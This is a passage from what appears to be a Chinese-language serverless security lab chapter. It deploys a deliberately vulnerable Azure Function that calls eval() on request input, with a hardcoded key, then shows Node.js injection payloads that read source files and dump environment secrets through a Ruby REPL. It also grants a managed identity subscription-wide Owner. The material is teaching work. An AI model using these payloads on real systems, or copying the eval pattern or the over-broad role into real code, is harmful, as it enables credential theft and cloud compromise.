  \n5. 找到并点击“Open editor”按钮（`{}`），在 Figure 11-4 中突出显示，以打开集成代码编辑器并直接在 Azure 门户中修改你的函数文件。\n\
  \n![](img/lsse_1104.png)\n\n这应该启动集成的 Cloud Shell 代码编辑器——允许你直接在 Azure 门户内查看和编辑你的函数代码。\n\
  \n6. 在代码编辑器中打开 `vulnerable-function/src/functions/evaluate.js`。\n\n7. 用以下内容替换 `evaluate.js`\
  \ 中的代码，使其返回 `SAMPLE_API_KEY` 环境变量的值：\n\n```\nconst { app } = require('@azure/functions');\n\
  \nconst HARDCODED_KEY = \"67890ghijkl\";\n\napp.http('evaluate', {\n    methods:\
  \ ['GET', 'POST'],\n    authLevel: 'anonymous',\n    handler: async (request, context)\
  \ => {\n        const key = process.env.SAMPLE_API_KEY;\n\n        return { body:\
  \ `SAMPLE_API_KEY=${key}` };\n    }\n});\n```\n\n在这里，你有一个示例函数，其中包含硬编码密钥（`HARDCODED_KEY`）以及环境变量（`SAMPLE_API_KEY`），它允许函数访问各种服务和资源。例如，函数可以使用硬编码密钥（`HARDCODED_KEY`）和环境变量（`SAMPLE_API_KEY`）来连接到外部\
  \ API 端点。\n\n8. 在 Cloud Shell 终端（`$` 符号之后）中，运行以下命令将更新后的函数代码（`evaluate.js`）部署到你的函数应用：\n\
  \n```\nfunc azure functionapp publish $FUNCTION_APP\n```\n\n#### Note\n\n如果在运行 `func\
  \ azure functionapp publish`（或其他 CLI 命令）时遇到 `Response status code does not indicate\
  \ success: 401 (Unauthorized)`，请尝试重新进行身份验证（或者，你可以刷新页面然后再尝试运行命令）。\n\n9. 在新的浏览器标签页中打开输出中显示的\
  \ Invoke URL，以确认函数能够成功加载环境变量（`SAMPLE_API_KEY`）。你应该得到以下内容：\n\n```\nSAMPLE_API_KEY=12345abcdef\n\
  ```\n\n10. 在代码编辑器中打开 `vulnerable-function/src/functions/evaluate.js`。用以下有意设计为易受攻击的表达式求值器代码替换\
  \ `evaluate.js` 的内容：\n\n```\nconst { app } = require('@azure/functions');\n\nconst\
  \ HARDCODED_KEY = \"67890ghijkl\";\n\napp.http('evaluate', {\n  methods: ['POST'],\n\
  \  authLevel: 'function',\n  handler: async (request, context) => {\n    const expression\
  \ = await request.text() || '\"No expression provided\"';\n\n    let result;\n \
  \   try {\n      result = eval(expression);\n    } catch (err) {\n      result =\
  \ `Error: ${err.message}`;\n    }\n\n    return { body: `Evaluation result: ${result}`\
  \ };\n  }\n});\n```\n\n在这里，除了拥有硬编码密钥外，你还有一个使用 `eval()` 执行不受信任输入的函数，这使得攻击者可以轻松地窃取授予跨云平台和第三方服务访问权限的敏感凭据。\n\
  \n#### Note\n\n由于代码中使用的凭据仅为示例占位符，其余易受攻击的函数已被省略，以保持示例的聚焦和清晰。\n\n11. 在终端中运行以下命令以部署最新更改：\n\
  \n```\nfunc azure functionapp publish $FUNCTION_APP\n```\n\n12. 在新的浏览器标签页中打开 Invoke\
  \ URL。你现在应该得到以下消息，因为 `authLevel` 设置为 `function`：\n\n```\nThis functionapp....azurewebsites.net\
  \ page can't be found\n\nNo webpage was found for the web address...\nHTTP ERROR\
  \ 404\n```\n\n#### Note\n\n当 `authLevel` 设置为 `function` 时，你必须在请求中包含有效的函数密钥才能成功调用端点。由于此函数是有意设计为易受攻击的，此设置可确保只有你才能调用和测试它（来自\
  \ Attacker 账户），而不是将其暴露给攻击者利用。\n\n13. 切换回 Cloud Shell 终端，然后运行以下命令（在 `$` 符号之后）将函数的\
  \ Invoke URL 存储在环境变量（`INVOKE_URL`）中：\n\n```\nINVOKE_URL=\"[SPECIFY INVOKE URL]\"\
  \n```\n\n在运行命令之前，请务必将 `[SPECIFY INVOKE URL]` 替换为函数的 Invoke URL。\n\n14. 准备就绪后，让我们测试已部署的函数。检索函数应用中\
  \ `evaluate` 函数的函数密钥：\n\n```\nKEY=$(az functionapp function keys list \\\n  --resource-group\
  \ $RESOURCE_GROUP \\\n  --name $FUNCTION_APP \\\n  --function-name evaluate)\n\n\
  echo $KEY\n```\n\n以下是输出：\n\n```\n{\n  \"default\": \"...\",\n  \"id\": null,\n \
  \ \"kind\": null,\n  \"name\": null,\n  \"properties\": null,\n  \"type\": null\n\
  }\n```\n\n从检索到的密钥中提取默认函数密钥：\n\n```\nFUNCTION_KEY=$(echo $KEY | jq -r \".default\"\
  )\necho $FUNCTION_KEY\n```\n\n#### Caution\n\n请勿公开或共享你的函数密钥，因为任何拥有此密钥的人都可以调用你的有意设计为易受攻击的函数。\n\
  \n通过发送带有简单表达式（`2+2`）的 `POST` 请求来测试 `evaluate` 函数：\n\n```\ncurl -X POST \"$INVOKE_URL?code=$FUNCTION_KEY\"\
  \ \\\n  -H \"Content-Type: text/plain\" \\\n  -d \"2+2\"\n```\n\n这会输出以下内容：\n\n```\n\
  Evaluation result: 4\n```\n\n再次使用另一个有效表达式（`(2 + 2) * 7`）测试 `evaluate` 函数：\n\n```\n\
  curl -X POST \"$INVOKE_URL?code=$FUNCTION_KEY\" \\\n  -H \"Content-Type: text/plain\"\
  \ \\\n  -d \"(2 + 2) * 7\"\n```\n\n这应该成功返回以下求值结果：\n\n```\nEvaluation result: 28\n\
  ```\n\n\n\n\n\n你已完成在 Azure 中设置一个易受攻击的无服务器函数的配置。该函数预期接受有效的数学表达式作为输入，并通过使用 `eval()`\
  \ 来对其进行求值。在实际应用中，该函数可能可以公开访问，并可从前端界面调用。正如本节开头所述，为保持示例简单并专注于函数本身，本章将跳过前端界面的实现。考虑到这些要点，接下来让我们探索如何借助自定义脚本来利用此无服务器函数。\n\
  \n### Exploiting the Vulnerable Serverless Function\n\n现在，你将模拟攻击者利用你在前一节中部署的易受攻击的无服务器函数。不是手动调用该函数，你将使用一个自定义脚本，该脚本通过自定义\
  \ REPL 部分自动化了与函数的交互。使用此脚本，你将首先测试无服务器函数预期的有效数学表达式，然后逐步转向使用代码注入有效负载，以探索部署的代码、读取配置文件，并枚举函数应用中存储的环境变量（Figure\
  \ 11-5）。\n\n![](img/lsse_1105.png)\n\n在过程中，你将了解 `eval()` 的不安全使用如何使代码注入攻击成为可能，并在无服务器函数环境中执行任意命令。这将帮助你理解使用\
  \ `eval()` 的实际后果，以及攻击者如何利用它来枚举环境。\n\n#### Note\n\n本节假设你使用的是 Attacker 账户。为避免第一个和第二个账户之间的会话冲突，在使用第二个账户登录前，请使用不同的浏览器或隐身/私人窗口。\n\
  \n让我们详细回顾步骤：\n\n1. 在新的浏览器窗口中打开 [*https://portal.azure.com*](https://portal.azure.com)\
  \ 并使用 Attacker 账户登录。\n\n2. 通过单击 Azure 门户顶部导航栏中的 `>_` 图标启动 Azure Cloud Shell。\n\n\
  \    ###### Note\n\n    首次启动时，你将经历与 Serverless Lab 账户相同的初始设置过程。系统提示选择 Bash 或 PowerShell\
  \ 时，选择 Bash 作为 shell 环境。然后，为确保文件在会话之间得以保留，选择“Mount storage account”，选择相应的存储账户订阅，然后从挂载存储账户的选项列表中选择“We\
  \ will create a storage account for you”。\n\n3. 在 Cloud Shell 终端中（在 `$` 符号之后）运行以下命令以创建名为\
  \ `tester.rb` 的新 Ruby 脚本文件：^(7)\n\n    ```\n    touch tester.rb\n    ```\n\n4. 单击\
  \ Editor 以访问 Cloud Shell 的内置代码编辑器。\n\n5. 如果提示切换到 Classic Cloud Shell，选择 Confirm。\n\
  \n6. 找到并单击“Open editor”按钮（`{}`）以打开集成代码编辑器。打开 `tester.rb` 并用以下内容更新其内容：\n\n    ```\n\
  \    require 'net/http'\n    require 'uri'\n    \n    INVOKE_URL = ENV['INVOKE_URL']\n\
  \    FUNCTION_KEY = ENV['FUNCTION_KEY']\n    \n    unless INVOKE_URL && FUNCTION_KEY\n\
  \      puts \"Please set INVOKE_URL and FUNCTION_KEY environment variables.\"\n\
  \      exit 1\n    end\n    \n    uri = URI.parse(\"#{INVOKE_URL}?code=#{FUNCTION_KEY}\"\
  )\n    \n    loop do\n      print \"Enter an expression (or type 'exit' to quit):\
  \ \"\n      input = gets.strip\n      break if input.downcase == 'exit'\n    \n\
  \      request = Net::HTTP::Post.new(uri)\n      request['Content-Type'] = 'text/plain'\n\
  \      request.body = input\n    \n      response = Net::HTTP.start(uri.hostname,\n\
  \                                 uri.port,\n                                 use_ssl:\
  \ uri.scheme == 'https') do |http|\n        http.request(request)\n      end\n \
  \   \n      puts \"[OUTPUT RESPONSE] #{response.body}\"\n    end\n    ```\n\n  \
  \  此 Ruby 脚本仅接受用户输入，将其作为 `POST` 请求发送并附带所需的函数密钥，然后打印函数的响应。有了此脚本，你就可以轻松测试各种表达式和有效负载，而无需反复输入\
  \ `curl` 命令。\n\n    ###### Note\n\n    本模拟中使用的易受攻击函数已通过函数密钥进行了保护，以便只有你可以在模拟攻击者利用代码注入漏洞和错误配置时调用它。在现实世界的无服务器应用中，Azure\
  \ Functions 可能并不总是通过函数密钥或其他身份验证机制进行保护，且某些函数甚至在生产环境中也可能公开可访问。\n\n7. 从 Serverless\
  \ Lab 账户的 Cloud Shell 终端复制 Invoke URL 和函数密钥的值。切换到 Attacker 账户的浏览器窗口和 Cloud Shell\
  \ 终端，并将这些值存储在环境变量 `INVOKE_URL` 和 `FUNCTION_KEY` 中，以便在后续命令中重复使用：\n\n    ```\n   \
  \ INVOKE_URL=\"[SPECIFY INVOKE URL]\"\n    FUNCTION_KEY=\"[SPECIFY FUNCTION KEY]\"\
  \n    ```\n\n    ###### Caution\n\n    在 Attacker 账户的 Cloud Shell 终端中运行命令前，请将占位符替换为相应的\
  \ Invoke URL 和函数密钥值。\n\n8. 准备就绪后，让我们运行 Ruby 脚本：\n\n    ```\n    export INVOKE_URL=$INVOKE_URL\n\
  \    export FUNCTION_KEY=$FUNCTION_KEY\n    \n    ruby tester.rb\n    ```\n\n  \
  \  这将启动一个 REPL，允许你交互式地输入表达式供无服务器函数求值：\n\n    ```\n    Enter an expression (or type\
  \ 'exit' to quit):\n    ```\n\n    在幕后，该脚本仅作为 `curl` 的便捷层，自动处理带函数密钥的 `POST` 请求，并返回函数的输出，而无需你重新输入长命令。\n\
  \n9. 在脚本的 REPL 中，在 `Enter an expression (or type 'exit' to quit)` 之后，首先输入函数可以求值的数学表达式：\n\
  \n    ```\n    2 + 5\n    ```\n\n    这会产生以下输出：\n\n    ```\n    [OUTPUT RESPONSE]\
  \ Evaluation result: 7\n    ```\n\n    列出当前文件夹中的所有文件和目录：\n\n    ```\n    require('fs').readdirSync('./')\n\
  \    ```\n\n    这会产生以下输出：\n\n    ```\n    [OUTPUT RESPONSE] Evaluation result: package-lock.json,function-vars.sh,package.json,host.json,node_modules,src\n\
  \    ```\n\n    这里，表达式成功列出了函数应用工作目录的内容，因为易受攻击的函数通过 `eval()` 求值了任意 JavaScript 输入。这使你能够访问内置的\
  \ Node.js 模块，例如 `fs`，然后使用它执行文件系统操作。\n\n    ###### Note\n\n    真实世界的攻击者会尝试各种表达式和有效负载以查看哪些可以成功执行。在确认任意代码执行是可能之后，攻击者会继续进行文件系统探索、环境变量枚举和其他后利用活动。请记住，在给定环境中成功执行的确切有效负载和表达式取决于实现细节：语言运行时和版本；输入的解析、编码或转义方式；应用的任何清理或验证；以及函数在运行时公开的库、模块、API\
  \ 或云绑定。\n\n    检查 `package.json` 文件：\n\n    ```\n    require('fs').readFileSync('package.json',\
  \ 'utf8')\n    ```\n\n    这返回以下内容：\n\n    ```\n    [OUTPUT RESPONSE] Evaluation\
  \ result: {\n      \"name\": \"\",\n      \"version\": \"1.0.0\",\n      \"description\"\
  : \"\",\n      \"main\": \"src/functions/*.js\",\n      \"scripts\": {\n       \
  \ \"start\": \"func start\",\n        \"test\": \"echo \\\"No tests yet...\\\"\"\
  \n      },\n      \"dependencies\": {\n        \"@azure/functions\": \"⁴.0.0\"\n\
  \      },\n      \"devDependencies\": {\n        \"azure-functions-core-tools\"\
  : \"⁴.x\"\n      }\n    }\n    ```\n\n\n\n\n\n接下来，检查 `host.json` 文件：\n\n```\nrequire('fs').readFileSync('host.json',\
  \ 'utf8')\n```\n\n这会产生以下输出：\n\n```\nOUTPUT RESPONSE] Evaluation result: {\n  \"\
  version\": \"2.0\",\n  \"logging\": {\n    \"applicationInsights\": {\n      \"\
  samplingSettings\": {\n        \"isEnabled\": true,\n        \"excludedTypes\":\
  \ \"Request\"\n      }\n    }\n  },\n  \"extensionBundle\": {\n    \"id\": \"Microsoft.Azure.Functions.ExtensionBundle\"\
  ,\n    \"version\": \"[4.*, 5.0.0)\"\n  }\n}\n```\n\n列出 `src` 文件夹中的所有文件和目录：\n\n\
  ```\nrequire('fs').readdirSync('./src')\n```\n\n输出如下：\n\n```\n[OUTPUT RESPONSE]\
  \ Evaluation result: functions\n```\n\n列出 `src/functions` 目录中的所有文件：\n\n```\nrequire('fs').readdirSync('./src/functions')\n\
  ```\n\n这会产生以下输出：\n\n```\n[OUTPUT RESPONSE] Evaluation result: evaluate.js\n```\n\
  \n##### 10. 检查存储在 `src/functions` 目录中的 `evaluate.js` 文件\n\n```\nrequire('fs').readFileSync('./src/functions/evaluate.js',\
  \ 'utf8')\n```\n\n这会返回函数的源代码：\n\n```\n[OUTPUT RESPONSE] Evaluation result: const\
  \ { app } = require('@azure/...');\n\nconst HARDCODED_KEY = \"67890ghijkl\";\n\n\
  app.http('evaluate', {\n  methods: ['POST'],\n  authLevel: 'function',\n  handler:\
  \ async (request, context) => {\n    const expression = await request.text() ||\
  \ '\"No expression provided\"';\n\n    let result;\n    try {\n      result = eval(expression);\n\
  \    } catch (err) {\n      result = `Error: ${err.message}`;\n    }\n\n    return\
  \ { body: `Evaluation result: ${result}` };\n  }\n});\n```\n\n#### Note\n\n在此，攻击者可以窃取函数代码中任何硬编码的凭据（例如\
  \ `HARDCODED_KEY`），并使用它们来调用其他服务或 API。在本示例中，这些密钥仅为占位符值，不会授予真实访问权限。然而，在现实世界中，泄露的硬编码密钥可能会让攻击者访问数据库、内部\
  \ API 以及跨云平台和第三方服务的其他资源。\n\n检索环境变量：\n\n```\nJSON.stringify(process.env)\n```\n\n\
  这会产生以下输出：\n\n```\nEvaluation result: {\"ALLUSERSPROFILE\":\"C:\\\\local\\\\ProgramData\"\
  ,...}\n```\n\n由于前面的命令返回了所有环境变量及其值，因此仅列出所有环境变量的名称：\n\n```\nJSON.stringify(Object.keys(process.env))\n\
  ```\n\n以下是输出：\n\n```\n[OUTPUT RESPONSE] Evaluation result:\n[\"ALLUSERSPROFILE\"\
  ,\"APPDATA\",...\"SAMPLE_API_KEY\",...,\n \"WEBSOCKET_CONCURRENT_REQUEST_LIMIT\"\
  ,\"windir\",\n \"WORKER_INDEXING_ENABLED\"]\n```\n\n输入 `exit` 并按 Enter 停止脚本并返回到命令行。\n\
  \n##### 11. 让我们更新脚本，使环境变量以更易读的方式呈现\n\n在 Cloud Shell 编辑器中，打开 `tester.rb` 文件并使用以下内容更新它：\n\
  \n```\nrequire 'net/http'\nrequire 'uri'\nrequire 'json'\n\nINVOKE_URL = ENV['INVOKE_URL']\n\
  FUNCTION_KEY = ENV['FUNCTION_KEY']\n\nunless INVOKE_URL && FUNCTION_KEY\n  puts\
  \ \"Please set INVOKE_URL and FUNCTION_KEY environment variables.\"\n  exit 1\n\
  end\n\nuri = URI.parse(\"#{INVOKE_URL}?code=#{FUNCTION_KEY}\")\n\nloop do\n  print\
  \ \"Enter an expression (or type 'exit' to quit): \"\n  input = gets.strip\n  break\
  \ if input.downcase == 'exit'\n\n  request = Net::HTTP::Post.new(uri)\n  request['Content-Type']\
  \ = 'text/plain'\n  request.body = input\n\n  response = Net::HTTP.start(uri.hostname,\n\
  \                             uri.port,\n                             use_ssl: uri.scheme\
  \ == 'https') do |http|\n    http.request(request)\n  end\n\n  body = response.body.strip\n\
  \n  if body.start_with?(\"Evaluation result:\")\n    raw_result = body.sub(\"Evaluation\
  \ result:\", \"\").strip\n\n    begin\n      parsed = JSON.parse(raw_result)\n \
  \     puts \"[OUTPUT RESPONSE]\\n#{JSON.pretty_generate(parsed)}\"\n    rescue JSON::ParserError\n\
  \      puts \"[OUTPUT RESPONSE] #{raw_result}\"\n    end\n  else\n    puts \"[OUTPUT\
  \ RESPONSE] #{body}\"\n  end\nend\n```\n\n脚本已更新，以便更轻松地读取来自无服务器函数的输出 JSON 响应。\n\n\
  #### Tip\n\n编写自定义脚本和修改现有代码是构建可加速安全测试的自动化工具的关键技能。即使你没有丰富的编码经验，也可以依靠 AI 驱动的编码助手来帮助你开发、调试和改进可自动化重复性任务的脚本。你不仅限于为测试漏洞编写自定义脚本，还可以自动化报告、数据收集、代码审查和其他安全相关任务。\n\
  \n##### 12. 运行更新后的 Ruby 脚本来启动 REPL\n\n```\nruby tester.rb\n```\n\n##### 13. 在脚本的\
  \ REPL 中，在 `Enter an expression (or type 'exit' to quit)` 之后，首先输入一个函数可以计算的数学表达式\n\
  \n```\n42 + 2\n```\n\n这会输出以下内容：\n\n```\n[OUTPUT RESPONSE]\n44\n```\n\n检索并显示所有环境变量：\n\
  \n```\nJSON.stringify(process.env)\n```\n\n你应该会得到一个格式良好的 JSON 输出，其中包含所有环境变量及其值：\n\
  \n```\n[OUTPUT RESPONSE]\n{\n  \"ALLUSERSPROFILE\": \"C:\\\\local\\\\ProgramData\"\
  ,\n  \"APPDATA\": \"C:\\\\local\\\\AppData\",\n  \"APPLICATIONINSIGHTS_CONNECTION_STRING\"\
  : \"...,\n  \"APPSETTING_APPLICATIONINSIGHTS_CONNECTION_STRING\": \"...\",\n  \"\
  APPSETTING_AzureWebJobsStorage\": \"...\",\n  \"APPSETTING_FUNCTIONS_EXTENSION_VERSION\"\
  : \"~4\",\n  \"APPSETTING_FUNCTIONS_WORKER_RUNTIME\": \"node\",\n  \"APPSETTING_SAMPLE_API_KEY\"\
  : \"12345abcdef\",\n\n  ...\n\n  \"WEBSITE_SITE_NAME\": \"functionapp12345\",\n\
  \  \"WEBSITE_SKU\": \"Dynamic\",\n  \"WEBSITE_SLOT_NAME\": \"Production\",\n  \"\
  WEBSITE_VOLUME_TYPE\": \"AzureFiles\",\n  \"WEBSOCKET_CONCURRENT_REQUEST_LIMIT\"\
  : \"35\",\n  \"windir\": \"C:\\\\Windows\",\n  \"WORKER_INDEXING_ENABLED\": \"1\"\
  \n}\n```\n\n这次，由于输出现在以结构化 JSON 格式呈现，与之前的原始转储相比，你应该能够更快地扫描和定位值。\n\n#### Note\n\n\
  你应该在评估 `JSON.stringify(process.env)` 后的 JSON 输出中找到环境变量 `SAMPLE_API_KEY`。\n\n最后，检索并显示\
  \ `SAMPLE_API_KEY` 环境变量的值：\n\n```\nJSON.stringify(process.env.SAMPLE_API_KEY)\n\
  ```\n\n以下是输出：\n\n```\n[OUTPUT RESPONSE]\n\"12345abcdef\"\n```\n\n此时，你应该知道为什么应避免在应用程序中使用\
  \ `eval()`。虽然本节重点关注使用 `eval()` 的安全风险，但请注意，代码注入攻击可以通过许多其他方式发生。示例包括 `exec()` 或 `spawn()`\
  \ 等函数的不安全使用、不安全的模板渲染、反序列化漏洞，或未经过清理的输入传递到 shell 命令或 SQL 查询中。\n\n请记住，并非每一次代码注入都会导致远程代码执行。然而，即使不执行任意代码，也可能泄露密钥、操纵应用程序行为或允许攻击者提升权限。理解这些细微差别将有助于你构建能够抵御代码注入漏洞和其他基于输入的攻击的安全无服务器应用程序。\n\
  \n### 在 Azure Key Vault 中存储密钥\n\n\n\n\n\n你现在已经看到攻击者如何轻松利用代码漏洞来窃取凭据，无论这些凭据是硬编码在函数中还是存储在环境变量中。在本节中，你将更新你的有意易受攻击的无服务器实验室，并通过将机密存储在\
  \ Azure Key Vault 中引入一种更安全处理敏感值的方法。从防御安全角度来看，Azure Key Vault 通过将机密移出源代码和配置文件，为硬编码凭据提供了一种更安全的替代方案。虽然它不是万能药，但使用机密管理器服务有助于缓解与在源代码中存储机密相关的许多常见风险。\n\
  \nFigure 11-6 说明了你在完成本节后，无服务器实验室账户的配置情况。要完成设置，你将创建一个 Key Vault，存储占位符机密，并为你的函数应用配置托管身份以在运行时安全地检索机密。\n\
  \n![](img/lsse_1106.png)\n\n#### Note\n\n本节假设你正在使用你的 Serverless Lab 账户，其中易受攻击的无服务器函数已部署。你将通过设置和配置额外的资源，包括\
  \ Key Vault 和函数应用的托管身份，来扩展此初始无服务器实验室环境。\n\n让我们逐步详细了解步骤：\n\n##### 1. 切换回 Serverless\
  \ Lab 账户的浏览器窗口和 Cloud Shell 终端。\n\n#### Tip\n\n如果你的 Cloud Shell 会话已超时，只需在 Cloud\
  \ Shell 弹出窗口中点击 Reconnect 按钮即可在继续之前恢复会话。\n\n##### 2. 运行以下命令在你的资源组中创建一个名称随机生成的新 Key\
  \ Vault（`$` 符号之后）：^8\n\n```\nsource ~/vulnerable-function/function-vars.sh\n\nKEYVAULT_NAME=\"\
  keyvault$RANDOM\"\n\naz keyvault create \\\n  --name $KEYVAULT_NAME \\\n  --resource-group\
  \ $RESOURCE_GROUP \\\n  --location $LOCATION \\\n  --sku standard\n```\n\n一分钟左右后，这会产生以下输出：\n\
  \n```\n{\n  \"id\": \"/subscriptions/.../vaults/keyvault...\",\n  \"location\":\
  \ \"eastus\",\n  \"name\": \"keyvault...\",\n  \"properties\": {\n    ...\n  },\n\
  \  \"resourceGroup\": \"rg-serverless-security-lab\",\n  \"systemData\": {\n   \
  \ ...\n  },\n  \"tags\": {},\n  \"type\": \"Microsoft.KeyVault/vaults\"\n}\n```\n\
  \n##### 3. 检查是否为你刚刚创建的 Key Vault 启用了基于角色的访问控制（RBAC）授权：\n\n```\naz keyvault show\
  \ --name $KEYVAULT_NAME \\\n    --query properties.enableRbacAuthorization\n```\n\
  \n这应该返回 `true`。当 `enableRbacAuthorization` 为 `true` 时，表示你的 Key Vault 使用 Azure RBAC\
  \ 而不是旧版访问策略。^9\n\n##### 4. 以 JSON 格式显示当前已登录用户的详细信息：\n\n```\naz ad signed-in-user\
  \ show \\\n  --query \"{displayName: displayName, upn:userPrincipalName, id:id}\"\
  \ \\\n  -o json\n```\n\n以下是输出：\n\n```\n{\n  \"displayName\": \"...\",\n  \"id\"\
  : \"...\",\n  \"upn\": \"...\"\n}\n```\n\n##### 5. 使用以下命令检索用户主体名称（UPN）：\n\n```\n\
  QUERY_RESULTS=$(az ad signed-in-user show \\\n  --query \"{displayName: displayName,\
  \ upn:userPrincipalName, id:id}\" \\\n  -o json)\n\nUSER_UPN=$(echo $QUERY_RESULTS\
  \ | jq -r \".upn\")\necho $USER_UPN\n```\n\n输出如下所示：\n\n```\nadmin@....onmicrosoft.com\n\
  ```\n\n##### 6. 检索当前 Azure 订阅 ID：\n\n```\nSUBSCRIPTION_ID=$(az account show --query\
  \ id -o tsv)\necho $SUBSCRIPTION_ID\n```\n\n你应该得到一个 UUID 风格的字符串，唯一标识你的当前 Azure 订阅。\n\
  \n##### 7. 为你的用户账户分配指定的 Key Vault 的 Key Vault Secrets Officer 角色：\n\n```\nSCOPE_RG=\"\
  /subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP\"\nSCOPE_KV=\"/providers/Microsoft.KeyVault/vaults/$KEYVAULT_NAME\"\
  \nSCOPE=\"$SCOPE_RG$SCOPE_KV\"\n\naz role assignment create \\\n  --role \"Key Vault\
  \ Secrets Officer\" \\\n  --assignee $USER_UPN \\\n  --scope $SCOPE\n```\n\n这会产生以下输出：\n\
  \n```\n{\n  \"condition\": null,\n  \"conditionVersion\": null,\n  \"createdBy\"\
  : null,\n  \"createdOn\": \"2025-00-00T00:00:00.000000+00:00\",\n  \"delegatedManagedIdentityResourceId\"\
  : null,\n  \"description\": null,\n  \"id\": \"/subscriptions/.../roleAssignments/...\"\
  ,\n  \"name\": \"...\",\n  \"principalId\": \"...\",\n  \"principalType\": \"User\"\
  ,\n  \"resourceGroup\": \"rg-serverless-security-lab\",\n  \"roleDefinitionId\"\
  : \"/subscriptions/.../roleDefinitions/...\",\n  \"scope\": \"/subscriptions/.../vaults/keyvault...\"\
  ,\n  \"type\": \"Microsoft.Authorization/roleAssignments\",\n  \"updatedBy\": \"\
  ...\",\n  \"updatedOn\": \"2025-00-00T00:00:00.000000+00:00\"\n}\n```\n\n#### Note\n\
  \n这为你的用户账户提供了管理并访问指定 Key Vault 中机密所需的权限，同时将这些权限限制在该 Key Vault 范围内。\n\n##### 8. 现在让我们在\
  \ Key Vault 中添加并存储两个机密。在指定的 Key Vault 中创建一个名为 `secret00` 的新机密：\n\n```\naz keyvault\
  \ secret set \\\n  --vault-name $KEYVAULT_NAME \\\n  --name \"secret00\" \\\n  --value\
  \ \"SECRETABC123\"\n```\n\n在指定的 Key Vault 中创建另一个名为 `secret01` 的机密：\n\n```\naz keyvault\
  \ secret set \\\n  --vault-name $KEYVAULT_NAME \\\n  --name \"secret01\" \\\n  --value\
  \ \"SECRETDEF456\"\n```\n\n##### 9. 为你的函数应用启用系统分配的托管身份：\n\n```\nsource ~/vulnerable-function/function-vars.sh\n\
  \naz functionapp identity assign \\\n  --name $FUNCTION_APP \\\n  --resource-group\
  \ $RESOURCE_GROUP\n```\n\n#### Note\n\nAzure 中的托管身份的工作方式类似于 AWS IAM 角色。它允许你的函数应用在不将凭据硬编码到代码中的情况下安全地访问其他资源。\n\
  \n##### 10. 检索函数应用的托管身份详细信息及其主体 ID：^10\n\n```\nDETAILS=$(az functionapp identity\
  \ show \\\n  --name $FUNCTION_APP \\\n  --resource-group $RESOURCE_GROUP)\n\nPRINCIPAL_ID=$(echo\
  \ $DETAILS | jq -r \".principalId\")\n```\n\n##### 11. 在订阅级别授予托管身份 Owner 权限：\n\n\
  ```\nSUBSCRIPTION_ID=$(az account show --query id -o tsv)\n\naz role assignment\
  \ create \\\n  --assignee $PRINCIPAL_ID \\\n  --role \"Owner\" \\\n  --scope /subscriptions/$SUBSCRIPTION_ID\n\
  ```\n\n##### 12. 将 Key Vault 名称设置为环境变量以供后续命令使用：\n\n```\nKEYVAULT_NAME=\"[SPECIFY\
  \ KEYVAULT NAME]\"\n```\n\n在运行命令之前，请确保将 `[SPECIFY KEYVAULT NAME]` 替换为 Key Vault\
  \ 资源的名称。\n\n#### Note\n\n如果 `KEYVAULT_NAME` 已在你的当前 Cloud Shell 会话中设置，可以跳过此步骤。你可以运行\
  \ `az keyvault list --query \"[].name\" -o table` 来检索 Key Vault 名称并将其分配给 `KEYVAULT_NAME`。\n\
  \n##### 13. 为指定的 Key Vault 将 Key Vault Secrets Officer 角色分配给托管身份：\n\n```\nSCOPE_RG=\"\
  /subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP\"\nSCOPE_KV=\"/providers/Microsoft.KeyVault/vaults/$KEYVAULT_NAME\"\
  \nSCOPE=\"$SCOPE_RG$SCOPE_KV\"\n\naz role assignment create \\\n  --role \"Key Vault\
  \ Secrets Officer\" \\\n  --assignee $PRINCIPAL_ID \\\n  --scope $SCOPE\n```\n\n\
  这为你的无服务器函数的托管身份提供了从 Key Vault 访问机密所需的权限。^11\n\n##### 14. 配置函数应用将 Key Vault 名称存储为环境变量：\n\
  \n\n\n\n\n```\naz functionapp config appsettings set \\\n  --name $FUNCTION_APP\
  \ \\\n  --resource-group $RESOURCE_GROUP \\\n  --settings KEYVAULT_NAME=$KEYVAULT_NAME\n\
  ```\n\nKey Vault 及其密钥就绪后，下一步是更新 `evaluate` 函数以直接从 Key Vault 中检索和使用密钥：\n\n1. 导航到你的函数目录并使用\
  \ `npm install` 安装 Azure Identity 和 Key Vault Secrets 包：\n\n```\ncd ~/vulnerable-function\n\
  \nnpm install @azure/identity @azure/keyvault-secrets\n```\n\n2. 检查 `package.json`\
  \ 文件：\n\n```\ncat package.json\n```\n\n输出如下：\n\n```\n{\n  \"name\": \"\",\n  \"\
  version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"src/functions/*.js\"\
  ,\n  \"scripts\": {\n    \"start\": \"func start\",\n    \"test\": \"echo \\\"No\
  \ tests yet...\\\"\"\n  },\n  \"dependencies\": {\n    \"@azure/functions\": \"\
  ⁴.0.0\",\n    \"@azure/identity\": \"⁴.12.0\",\n    \"@azure/keyvault-secrets\"\
  : \"⁴.10.0\"\n  },\n  \"devDependencies\": {\n    \"azure-functions-core-tools\"\
  : \"⁴.x\"\n  }\n}\n```\n\n3. 在代码编辑器中打开 `vulnerable-function/src/functions/evaluate.js`。\n\
  \n4. 用以下代码替换 `evaluate.js` 的内容：\n\n```\nconst { app } = require('@azure/functions');\n\
  const { DefaultAzureCredential } = require(\"@azure/identity\");\nconst { SecretClient\
  \ } = require(\"@azure/keyvault-secrets\");\n\nconst HARDCODED_KEY = \"67890ghijkl\"\
  ;\n\nconst KEY_VAULT_NAME = process.env.KEYVAULT_NAME;\nconst SECRET_NAMES = [\"\
  secret00\", \"secret01\"];\n\nconst KV_URL = `https://${KEY_VAULT_NAME}.vault.azure.net`;\n\
  \nconst credential = new DefaultAzureCredential();\nconst client = new SecretClient(KV_URL,\
  \ credential);\n\nconst secrets = {};\n(async () => {\n  for (const name of SECRET_NAMES)\
  \ {\n    try {\n      const secret = await client.getSecret(name);\n      secrets[name]\
  \ = secret.value;\n    } catch (err) {\n      console.error(`Failed to fetch secret\
  \ ${name}: ${err.message}`);\n      secrets[name] = null;\n    }\n  }\n})();\n\n\
  app.http('evaluate', {\n  methods: ['POST'],\n  authLevel: 'function',\n  handler:\
  \ async (request, context) => {\n    const expression = await request.text() ||\
  \ '\"No expression provided\"';\n\n    const { secret00, secret01 } = secrets;\n\
  \n    let result;\n\n    try {\n      result = eval(expression);\n    } catch (err)\
  \ {\n      result = `Error: ${err.message}`;\n    }\n\n    return { body: `Evaluation\
